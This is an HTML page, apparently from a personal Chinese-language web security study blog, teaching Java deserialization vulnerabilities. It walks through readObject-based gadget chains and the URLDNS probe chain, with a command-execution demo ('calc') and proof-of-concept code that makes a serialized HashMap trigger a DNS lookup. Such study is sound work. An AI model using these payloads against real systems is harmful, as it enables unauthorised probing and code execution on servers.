@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Java反序列化-基本概念与利用 · Maple/G7</title>
+<meta name="description" content="从序列化 / 反序列化讲起，写一遍 Java 的代码实现，再落到 readObject 的漏洞成因；最后用 URLDNS 这条最简链走一遍完整的复现流程。">
+<script>document.documentElement.classList.add('js');</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Space+Grotesk:wght@400;500;700&family=JetBrains+Mono:wght@400;500&family=Noto+Serif+SC:wght@400;600;900&family=Noto+Sans+SC:wght@300;400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="style.css?v=v17">
+</head>
+<body class="page-post">
+
+<div class="grain" aria-hidden="true"></div>
+<div class="rule-rail" aria-hidden="true"></div>
+<div class="progress" id="progress" aria-hidden="true"></div>
+<div class="cursor" id="cursor" aria-hidden="true"><span class="cursor-ring"></span><span class="cursor-dot"></span></div>
+
+<header class="topbar">
+  <a class="brand" href="index.html">
+    <span class="brand-mark">Maple<span class="t-slash">/</span>G7</span>
+  </a>
+  <nav class="nav">
+    <a href="index.html">首页</a>
+    <a href="notes.html" class="is-on">文章</a>
+    <a href="projects.html">项目</a>
+    <a href="links.html">友链</a>
+    <a href="about.html">关于</a>
+  </nav>
+  <p class="topbar-meta mono">VOL.01 / 2026</p>
+</header>
+
+<article class="post">
+
+  <header class="cover">
+    <div class="cover-art" aria-hidden="true">
+      <img src="img/cover-java.webp" alt="" style="object-position: 50% 45%" fetchpriority="high" decoding="async">
+    </div>
+    <div class="cover-ticks" aria-hidden="true"><i></i><i></i><i></i><i></i></div>
+
+    <div class="cover-inner">
+      <p class="kicker mono"><span class="k-no">01</span>NOTES <em>·</em> Java安全 <em>·</em> 2026.11.23</p>
+      <h1 class="post-title">Java反序列化-基本概念与利用</h1>
+      <p class="post-desc">从序列化 / 反序列化讲起，写一遍 Java 的代码实现，再落到 readObject 的漏洞成因；最后用 URLDNS 这条最简链走一遍完整的复现流程。</p>
+
+      <ul class="post-meta mono">
+        <li><b>1,974</b>字</li>
+        <li class="meta-tags"><b>TAGS</b><ul class="tag-list"><li>Java</li><li>反序列化</li><li>URLDNS</li><li>ysoserial</li></ul></li>
+      </ul>
+
+      <div class="cover-seal" aria-hidden="true"><span>墨</span></div>
+    </div>
+  </header>
+
+  <nav class="post-bar">
+    <a class="post-back" href="notes.html" data-hover><span>←</span>全部文章</a>
+    <span class="post-bar-mid mono">Java安全 · 1,974 字</span>
+  </nav>
+
+  <div class="layout">
+
+    <aside class="toc">
+      <div class="toc-sticky">
+        <p class="rail-h mono">INDEX</p>
+        <ol class="toc-list"><li class="toc-item toc-l2"><a href="#s1" data-toc="s1"><span class="toc-no">01</span><span class="toc-tx">序列化&反序列化</span></a></li><li class="toc-item toc-l2"><a href="#s2" data-toc="s2"><span class="toc-no">02</span><span class="toc-tx">Java序列化&反序列化代码实现</span></a></li><li class="toc-item toc-l2"><a href="#s3" data-toc="s3"><span class="toc-no">03</span><span class="toc-tx">序列化安全问题的产生</span></a></li><li class="toc-item toc-l3"><a href="#s4" data-toc="s4"><span class="toc-no">04</span><span class="toc-tx">漏洞形式</span></a></li><li class="toc-item toc-l3"><a href="#s5" data-toc="s5"><span class="toc-no">05</span><span class="toc-tx">触发路径</span></a></li><li class="toc-item toc-l3"><a href="#s6" data-toc="s6"><span class="toc-no">06</span><span class="toc-tx">实战——URLDNS</span></a></li></ol>
+        <img class="toc-mo" src="img/mo-01.webp" alt="" aria-hidden="true">
+      </div>
+    </aside>
+
+    <div class="prose"><blockquote><p>主要参考<a href="https://drun1baby.top/">Drunkbaby's Blog</a>进行学习</p></blockquote>
+<h2 id="s1">序列化&amp;反序列化<a class="h-link" href="#s1" aria-hidden="true">§</a></h2>
+<p><strong>序列化</strong>：对象-&gt;字节序列（字符串，二进制文件）</p>
+<p><strong>反序列化</strong>：字节-&gt;对象</p>
+<p>序列化和反序列化的设计主要是为了传递，在不同进程间通信，<strong>传输对象</strong>。</p>
+<p>序列化也能够实现数据的持久化，通过序列化可以把数据永久的<strong>保存</strong>在硬盘上（文件）</p>
+<p>常见的序列化和反序列化协议：</p>
+<ul><li>XML&amp;SOAP</li><li>JSON</li><li>Protobuf</li></ul>
+<p>Java原生当中也存在序列化与反序列化，用的比较少</p>
+<hr>
+<h2 id="s2">Java序列化&amp;反序列化代码实现<a class="h-link" href="#s2" aria-hidden="true">§</a></h2>
+<p><strong>Person.java</strong></p>
+<p>定义“人”这个对象</p>
+<div class="code" data-lang="java"><div class="code-head"><span class="code-lang">java</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs"><span class="hljs-keyword">package</span> com.study.serialize;  <span class="hljs-comment">//申明这个类属于com.study.serialize这个包（相当于文件夹路径）</span>
+
+<span class="hljs-keyword">import</span> java.io.Serializable;  <span class="hljs-comment">//从Java官方库（java.io包）里引入Serializable这个接口/工具</span>
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> Person <span class="hljs-keyword">implements</span> Serializable {
+<span class="hljs-comment">//java规定类名首字母大写且与文件名一致</span>
+<span class="hljs-comment">//implements Serializable:实现Serializable接口，意味着Person类可序列化(可存为文件/可传输)。</span>
+
+    <span class="hljs-keyword">private</span> String name;
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> age;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-title">Person</span>(){
+
+    }<span class="hljs-comment">//无参数构造方法，允许new Person()直接创建一个空的Person对象</span>
+
+    <span class="hljs-keyword">public</span> <span class="hljs-title">Person</span>(String name, <span class="hljs-keyword">int</span> age){
+        <span class="hljs-keyword">this</span>.name = name;
+        <span class="hljs-keyword">this</span>.age = age;
+    }<span class="hljs-comment">//有参数构造方法，把传进来的参数（name、age）赋值给当前对象的对应属性</span>
+
+    @Override <span class="hljs-comment">//注解，表示下面这个方法是重写父类的</span>
+    <span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span>(){
+        <span class="hljs-keyword">return</span> <span class="hljs-string">"Person{"</span> +
+                <span class="hljs-string">"name='"</span> + name + <span class="hljs-string">'\''</span> +
+                <span class="hljs-string">", age="</span> + age +
+                <span class="hljs-string">'}'</span>;
+    }<span class="hljs-comment">//toString()在把一个对象当字符串打印出来时调用，表示格式（不然打印出来就是一堆内存地址类似物）</span>
+}
+
+</code></pre></div>
+<p><strong>SerializationTest.java</strong></p>
+<p>序列化文件</p>
+<div class="code" data-lang="java"><div class="code-head"><span class="code-lang">java</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs"><span class="hljs-keyword">package</span> com.study.serialize;  <span class="hljs-comment">//同样申明在com.study.serialize包下，这样就可以找到同包的Person类</span>
+
+<span class="hljs-comment">//导入三个IO（输入输出）相关类</span>
+<span class="hljs-keyword">import</span> java.io.FileOutputStream; <span class="hljs-comment">//文件输出流，负责往文件里写字节</span>
+<span class="hljs-keyword">import</span> java.io.IOException;  <span class="hljs-comment">//输入输出异常类，用来申明“读写文件时可能会出错”</span>
+<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<span class="hljs-comment">//对象输出流，负责把Java对象转化为字节流</span>
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> SerializationTest {
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">serialize</span>(Object obj) <span class="hljs-keyword">throws</span> IOException{
+    <span class="hljs-comment">//static（静态）表示这个方法可以直接通过“类名.方法名”调用，不需要先new SerializationTest()</span>
+   <span class="hljs-comment">//Object:传什么对象进来都可以</span>
+   <span class="hljs-comment">//throws IOException声明了这个方法可能会发生IOException，一旦出现往上抛，交给调用它的方法处理</span>
+        ObjectOutputStream oos = <span class="hljs-keyword">new</span> <span class="hljs-title">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title">FileOutputStream</span>(<span class="hljs-string">"ser.bin"</span>));
+        <span class="hljs-comment">//FileOutputStream创建一个指向“ser.bin”文件的输出流（文件不存在自动创建）</span>
+        <span class="hljs-comment">//ObjectOutputStream把文件流包起来，变成能写对象的流</span>
+        oos.<span class="hljs-title">writeObject</span>(obj);  <span class="hljs-comment">//调用oos的writeObject方法，把传进来的对象obj序列化成字节，写入“ser.bin”</span>
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span>(String[] args) <span class="hljs-keyword">throws</span> Exception{<span class="hljs-comment">//throws Exception比IOException更宽泛的异常，遇到就抛出</span>
+        Person person = <span class="hljs-keyword">new</span> <span class="hljs-title">Person</span>(<span class="hljs-string">"aa"</span>,<span class="hljs-number">22</span>);
+        System.out.<span class="hljs-title">println</span>(person); <span class="hljs-comment">//打印Person的信息（底层调用person.toString()）</span>
+        <span class="hljs-title">serialize</span>(person);  <span class="hljs-comment">//调用serialize方法，把person对象存进“ser.bin”</span>
+    }
+}</code></pre></div>
+<p><strong>UnserializeTest.java</strong></p>
+<p>反序列化文件</p>
+<div class="code" data-lang="java"><div class="code-head"><span class="code-lang">java</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs"><span class="hljs-keyword">package</span> com.study.serialize;
+
+<span class="hljs-keyword">import</span> java.io.FileInputStream;  <span class="hljs-comment">//文件输入流，负责从文件中读字节</span>
+<span class="hljs-keyword">import</span> java.io.IOException;  <span class="hljs-comment">//IO异常</span>
+<span class="hljs-keyword">import</span> java.io.ObjectInputStream;  <span class="hljs-comment">//对象输入流，负责把字节重新还原成对象</span>
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> UnserializeTest {
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">unserialize</span>(String Filename) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException{
+    <span class="hljs-comment">//ClassNotFoundException：找不到对应类定义异常</span>
+        ObjectInputStream ois = <span class="hljs-keyword">new</span> <span class="hljs-title">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title">FileInputStream</span>(Filename));
+        Object obj = ois.<span class="hljs-title">readObject</span>();  <span class="hljs-comment">//从流中读取对象数据并还原，存进obj变量（类型：对象）</span>
+        <span class="hljs-keyword">return</span> obj;
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span>(String[] args) <span class="hljs-keyword">throws</span> Exception{
+        Person person = (Person)<span class="hljs-title">unserialize</span>(<span class="hljs-string">"ser.bin"</span>);  <span class="hljs-comment">//unserialize返回的是Object类型，在前面加（Person）表示强制类型转换，告诉编辑器这里面装的是Person，最后赋值给变量person</span>
+        System.out.<span class="hljs-title">println</span>(person);  
+    }
+}
+
+</code></pre></div>
+<p>注：<strong>Serializable接口</strong></p>
+<p>是Java提供的序列化接口，它是一个空接口，用来标识当前类可以被ObjectOutputStream序列化，以及被ObjectInputStream反序列化。</p>
+<ul><li>序列化类的属性如果没有实现Serializable，那么在序列化的时候就会报错。</li><li>如果父类没实现Serializable，子类实现了，反序列化还原子类的时候，需要先调用父类的无参数构造函数，把父类的部分状态初始化出来，再把子类数据填回去。如果父类既没有实现Serializable，又没有提供无参数构造函数，反序列化就会报错。</li><li>如果父类已经实现Serializable了，那么继承他的子类也是可以被序列化和反序列化的，不需要再写一遍implements Serializable</li><li>静态成员变量（static）是不可以被序列化的（序列化针对对象属性，静态变量属于类），序列化保存“某个具遗体对象”的数据状态时，不会把static变量写进去，反序列化时，也是直接读取当前JVM里那个类自身的static值，而不是从文件里恢复。</li><li>transient标识的对象成员变量不参与序列化，反序列化时这些字段会被赋上该类型的默认值（如 <code>String</code> 是 <code>null</code>，<code>int</code> 是 <code>0</code>，<code>boolean</code> 是 <code>false</code>） transient是Java的一个关键字，作用是告诉Java的序列化机制：这个字段属于这个对象，但不要把它存进文件/发出去。常使用在密码等敏感信息处（示例：<code>private transient String password</code>）</li></ul>
+<hr>
+<h2 id="s3">序列化安全问题的产生<a class="h-link" href="#s3" aria-hidden="true">§</a></h2>
+<p>序列化和反序列化当中有两个非常重要的方法：<strong>writeObject</strong>和<strong>readObject</strong></p>
+<p>这两个方法可以经过开发者重写以自定义序列化过程，具体的做法就是重写以下两个private方法：</p>
+<div class="code" data-lang="java"><div class="code-head"><span class="code-lang">java</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span>(java.io.ObjectOutputStream s)<span class="hljs-keyword">throws</span> java.io.IOException
+<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span>(java.io.ObjectInputStream s)<span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException</code></pre></div>
+<p>在服务端收到字节数据，准备反序列化（比如调用ois.readObject()）后，Java底层在把字节还原成对象的过程中会自动检查这个类有无private void readObject（），如果有，就会执行以恢复数据，而不是调用流工具类上的方法。</p>
+<p>虽然是private，但Iava底层反序列化机制可以通过反射去调用它。如果某个类在readObject里写了危险操作（比如命令执行，读文件等），反序列化恶意的字节流时就会触发这段代码。</p>
+<p>综上所述，Java反序列化的漏洞与readObject有关。</p>
+<hr>
+<h3 id="s4">漏洞形式<a class="h-link" href="#s4" aria-hidden="true">§</a></h3>
+<ol><li><p><strong>入口类的readObject直接调用危险方法</strong> 这种情况是最理想的，但一般不会出现。 示例：在Person类里自定义readObject方法，里面包含了让操作系统执行“calc”命令，在Windows中，这会启动系统的计算机程序（calc.exe）,所以在我们运行反序列化文件UnserializeTest.java时就会弹出计算器</p>
+<div class="code" data-lang="java"><div class="code-head"><span class="code-lang">java</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span>(ObjectInputStream ois) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException{
+    ois.<span class="hljs-title">defaultReadObject</span>();  <span class="hljs-comment">//按Java默认的方式，把Person的各个字段（比如name，age）从输入流ois里读出来并赋值</span>
+    Runtime.<span class="hljs-title">getRuntime</span>().<span class="hljs-title">exec</span>(<span class="hljs-string">"calc"</span>);
+}</code></pre></div></li><li><p><strong>入口类参数中包含可控类，该类有危险方法，readObject时调用</strong> 示例：</p>
+<div class="code" data-lang="java"><div class="code-head"><span class="code-lang">java</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> Box <span class="hljs-keyword">implements</span> Serializable {
+    <span class="hljs-keyword">private</span> Object item;  <span class="hljs-comment">//在Java里，任何类都是Object的子类，所以这个item可以是一个普通的String，也可以是一个别的复杂类的对象</span>
+
+    <span class="hljs-comment">// 反序列化 Box 时，Java 会自动执行这个 readObject</span>
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span>(ObjectInputStream ois) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException {
+        ois.<span class="hljs-title">defaultReadObject</span>(); <span class="hljs-comment">//  先把 item 这个内部对象读出来</span>
+        <span class="hljs-comment">// 开发者在这里主动写了一句：调用 item 的某个方法，就比如item.toString(),如果此时的item的toString（或者它顺带调用的下一个方法里）包含了危险操作，就能把危险代码带出来</span>
+        item.<span class="hljs-title">toString</span>();
+    }
+}</code></pre></div></li><li><p><strong>入口类参数中包含可控类，该类又调用其它有危险方法的类，readObject时调用</strong> 比2多跳了一层（利用链变长了），入口类-&gt;itemA-&gt;itemB-&gt;...最终在B或者更后面的类里触发危险操作</p></li><li><p><strong>构造函数/静态代码块等类加载时隐式执行</strong> 在反序列化还原对象、或者动态加载某些类/代理/资源的 nogle 流程中，可能会隐式触发某个类的加载或实例化，从而把里面 <code>static { ... }</code> 或构造函数里的代码顺带跑起来。</p></li></ol>
+<hr>
+<h3 id="s5">触发路径<a class="h-link" href="#s5" aria-hidden="true">§</a></h3>
+<p>攻击前提：继承Serializable接口</p>
+<p>source入口类：重写 <code>readObject</code> 调用常见的函数；参数类型宽泛，比如可以传入一个类作为参数；最好 <code>jdk</code> 自带</p>
+<p>gadget chain调用链：找同名方法，参数类型相同，调用传递</p>
+<p>sink执行类：链的最后一步，真正执行危险操作的类和方法（RCE，SSRF，写文件等）</p>
+<h3 id="s6">实战——URLDNS<a class="h-link" href="#s6" aria-hidden="true">§</a></h3>
+<p><strong>URLDNS：</strong> URL（网址/对象域名）+ DNS（域名解析请求），是一个极简的反序列化验证链，适用于检测（是序列化学习里最简单的一条“探路链”）：</p>
+<p>路线是<code>HashMap.readObject()</code> → <code>HashMap.putVal()</code> → <code>HashMap.hash()</code> → <code>URL.hashCode()</code>。把一个URL对象放进<code>HashMap</code> 的 <code>key</code> 并反序列化时，<code>URL.hashCode()</code> 会触发一次 <strong>DNS 解析请求</strong>。</p>
+<ul><li>只用了Java内置的类，不用装第三方仓库。</li><li>只能发送DNS请求，不能干别的，所以不算是利用，但是非常适合验证“目标有没有真的在反序列化”，如果确认有洞，再更换真正的利用链</li></ul>
+<p><strong>ysoserial</strong>：是安全圈里一个非常经典的 <strong>Java 反序列化 payload（恶意/测试字节流）生成工具</strong>，里面有非常多已经写好的利用链的构造代码（URLDNS就是其中最基础的一条）。简单来说，ysoserial就是把URLDNS等链一键生成可发送字节流的工具。</p>
+<p><strong>HashMap</strong>：是一个极其好用的起点（source）：</p>
+<ul><li>JDK自带+可序列化（几乎所有Java环境都有且实现了Serializable接口）</li><li>key可以塞进不同的对象（<code>hash(Object key)</code> 接收的是宽泛类型）</li><li>反序列化会自动处理内部元素（反序列化一个 <code>HashMap</code> 时，它的 <code>readObject</code> 会把存进去的 <code>key</code> 和 <code>value</code> 读出来，并调用 <code>hash(key)</code>，进而触发 <strong><code>key.hashCode()</code></strong>）</li></ul>
+<p><strong>话不多说，开始复现：</strong></p>
+<p>ysoserial对URLDNS的利用链（反序列化真正触发漏洞时的路线）</p>
+<div class="code" data-lang="text"><div class="code-head"><span class="code-lang">text</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs">ois.readObject()
+  → HashMap.readObject()     [反序列化总开关]
+    → HashMap.putVal()       [内部放元素的工人]
+      → HashMap.hash(key)    [算 key 的哈希]
+        → URL.hashCode()     [触发 DNS 查询]</code></pre></div>
+<h4 id="s7">手工跟进URLDNS的利用链<a class="h-link" href="#s7" aria-hidden="true">§</a></h4>
+<p>我们通过调用<code>hashmap.put(url, 1)</code>把URL放进HashMap里，<code>put</code> 方法之后又是调用了 <code>hash</code> 方法</p>
+<figure class="fig"><img src="img/java-1.webp" alt="76b24100-beff-4de3-afae-8673dbc90e1d" loading="lazy" decoding="async"></figure>
+<p><code>hash</code> 方法则是调用了 <code>hashcode</code> 这一函数</p>
+<figure class="fig"><img src="img/java-2.webp" alt="094b9cb2-6d92-49ed-a061-1e30d215d924" loading="lazy" decoding="async"></figure>
+<p><code>hashCode</code> 函数的变量名是 key，而key就是hash这一方法传进来的参数（也就是我们通过put传进的URL）</p>
+<p>因为我们的key是URL对象，所以我们去URL类里看看URL的hashCode()长什么样（<code>URL.hashCode</code> 不会自己把活干完，而是会一层一层往下调用方法）</p>
+<figure class="fig"><img src="img/java-3.webp" alt="998ba556-24dd-40c2-93b5-2c2d643dd86f" loading="lazy" decoding="async"></figure>
+<figure class="fig"><img src="img/java-4.webp" alt="199be6a2-dc30-4c9a-bb43-aa2ebcdf6d88" loading="lazy" decoding="async"></figure>
+<p>URL 中的 <code>hashCode</code> 被 <code>handler</code> 这一对象所调用，<code>handler</code> 又是 <code>URLStreamHandler</code> 的抽象类，于是我们再去找 <code>URLStreamHandler</code> 的 <code>hashCode</code> 方法</p>
+<figure class="fig"><img src="img/java-5.webp" alt="d961d39b-34f8-4ab5-b1d1-70c67218c3ed" loading="lazy" decoding="async"></figure>
+<p>找到了——getHostAddress（获取这个域名对应的 IP 地址），跟进<code>getHostAddress</code></p>
+<figure class="fig"><img src="img/java-6.webp" alt="2eec24a8-b92b-40e6-a1b1-03918a702743" loading="lazy" decoding="async"></figure>
+<p>这⾥ <code>InetAddress.getByName(host)</code> 的作⽤是根据主机名，获取其 IP 地址，在⽹络上其实就是⼀次 DNS 查询。</p>
+<h4 id="s8">URLDNS 反序列化利用链的 POC<a class="h-link" href="#s8" aria-hidden="true">§</a></h4>
+<ol><li><p>去DNSLog上生成一条测试域名</p></li><li><p>修改SerializationTest.java</p>
+<div class="code" data-lang="java"><div class="code-head"><span class="code-lang">java</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs"><span class="hljs-keyword">package</span> com.study.serialize;
+
+
+<span class="hljs-keyword">import</span> java.io.FileOutputStream;
+<span class="hljs-keyword">import</span> java.io.IOException;
+<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
+<span class="hljs-keyword">import</span> java.lang.reflect.Field;
+<span class="hljs-keyword">import</span> java.net.URL;
+<span class="hljs-keyword">import</span> java.util.HashMap;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> SerializationTest {
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">serialize</span>(Object obj) <span class="hljs-keyword">throws</span> IOException{
+        ObjectOutputStream oos = <span class="hljs-keyword">new</span> <span class="hljs-title">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title">FileOutputStream</span>(<span class="hljs-string">"ser.bin"</span>));
+        oos.<span class="hljs-title">writeObject</span>(obj);
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span>(String[] args) <span class="hljs-keyword">throws</span> Exception{
+        Person person = <span class="hljs-keyword">new</span> <span class="hljs-title">Person</span>(<span class="hljs-string">"aa"</span>,<span class="hljs-number">22</span>);
+        HashMap&lt;URL,Integer&gt; hashmap= <span class="hljs-keyword">new</span> HashMap&lt;URL,Integer&gt;();
+        
+        URL url = <span class="hljs-keyword">new</span> <span class="hljs-title">URL</span>(<span class="hljs-string">"http://测试域名"</span>);  <span class="hljs-comment">//此时是默认值-1</span>
+        Class c = url.<span class="hljs-title">getClass</span>();
+        Field hashcodefile = c.<span class="hljs-title">getDeclaredField</span>(<span class="hljs-string">"hashCode"</span>);
+        hashcodefile.<span class="hljs-title">setAccessible</span>(<span class="hljs-keyword">true</span>);
+
+        hashcodefile.<span class="hljs-title">set</span>(url,<span class="hljs-number">1234</span>); <span class="hljs-comment">// 1. 利用反射临时改掉 -1，防止 put 时提前发 DNS</span>
+        hashmap.<span class="hljs-title">put</span>(url,<span class="hljs-number">1</span>);
+
+        hashcodefile.<span class="hljs-title">set</span>(url,-<span class="hljs-number">1</span>); <span class="hljs-comment">// 2. 改回 -1，留到反序列化时再触发</span>
+        <span class="hljs-title">serialize</span>(hashmap); <span class="hljs-comment">// 3. 序列化写入 ser.bin</span>
+    }
+}</code></pre></div>
+<blockquote><p>如果直接</p>
+<div class="code" data-lang="java"><div class="code-head"><span class="code-lang">java</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs">HashMap&lt;URL,Integer&gt; hashmap= <span class="hljs-keyword">new</span> HashMap&lt;URL,Integer&gt;();
+hashmap.<span class="hljs-title">put</span>(<span class="hljs-keyword">new</span> <span class="hljs-title">URL</span>(<span class="hljs-string">"DNS生成的 URL，用dnslog就可以"</span>),<span class="hljs-number">1</span>);
+
+<span class="hljs-title">serialize</span>(hashmap);</code></pre></div>
+<p>在序列化时，由于hashcode的值不等于 -1 的时候，函数就会直接 <code>return hashCode</code> 而不执行 <code>hashCode = handler.hashCode(this);</code>（不再往下走，也就不会触发DNS查询）。而一开始<code>URL</code> 类自己设定<code>hashCode</code> 属性默认初始值<code>-1</code>，用来表示“还没算过哈希值”，于是便是发起了请求，所以我们在没有反序列化的情况下面，就会收到了 DNS 请求。</p>
+<figure class="fig"><img src="img/java-3.webp" alt="998ba556-24dd-40c2-93b5-2c2d643dd86f" loading="lazy" decoding="async"></figure></blockquote></li><li><p>运行SerializationTest.java生成ser.bin，此时DNSLog上并没有收到这条域名的DNS请求。</p></li><li><p>运行UnserializeTest.java，此时DNSLog上收到这条域名的DNS请求。</p>
+<div class="code" data-lang="java"><div class="code-head"><span class="code-lang">java</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span>(String[] args) <span class="hljs-keyword">throws</span> Exception{
+    Object obj = <span class="hljs-title">unserialize</span>(<span class="hljs-string">"ser.bin"</span>);
+    System.out.<span class="hljs-title">println</span>(obj);
+}</code></pre></div></li></ol></div>
+
+    <aside class="margin">
+      <div class="margin-sticky">
+        <p class="rail-h mono">READ</p>
+        <p class="margin-pct mono" id="readPct">000<span>%</span></p>
+        <img class="margin-mo" src="img/mo-02.webp" alt="" aria-hidden="true">
+        <div class="rail-more rail-more--right">
+          <p class="rail-h mono">ALL ARTICLES</p>
+          <ul class="rail-list"><li class="is-now"><a href="post-java-deserialize.html"><i>▸</i>Java反序列化-基本概念与利用</a></li><li><a href="post.html" data-hover><i>·</i>SSRF从0到1</a></li><li><a href="post-http.html" data-hover><i>·</i>HTTP 基础</a></li><li><a href="post-php.html" data-hover><i>·</i>PHP语言基础</a></li></ul>
+        </div>
+      </div>
+    </aside>
+
+  </div>
+</article>
+
+<footer class="foot">
+  <div class="foot-inner">
+    <a class="foot-back" href="notes.html" data-hover><span>←</span> 全部文章</a>
+
+    <div class="foot-nav">
+      <a class="foot-link" href="post-php.html" data-hover>
+        <span class="mono">PREV</span>
+        <b>PHP语言基础</b>
+      </a>
+      <a class="foot-link foot-link--next" href="post.html" data-hover>
+        <span class="mono">NEXT</span>
+        <b>SSRF从0到1</b>
+      </a>
+    </div>
+
+    <div class="foot-mo" aria-hidden="true">
+      <img src="img/mo-03.webp" alt="">
+      <img src="img/mo-05.webp" alt="">
+      <img src="img/mo-12.webp" alt="">
+    </div>
+
+    <p class="foot-copy">MAPLE (G7) · WEB SECURITY NOTES</p>
+  </div>
+</footer>
+
+<script src="app.js?v=v17"></script>
+</body>
+</html>
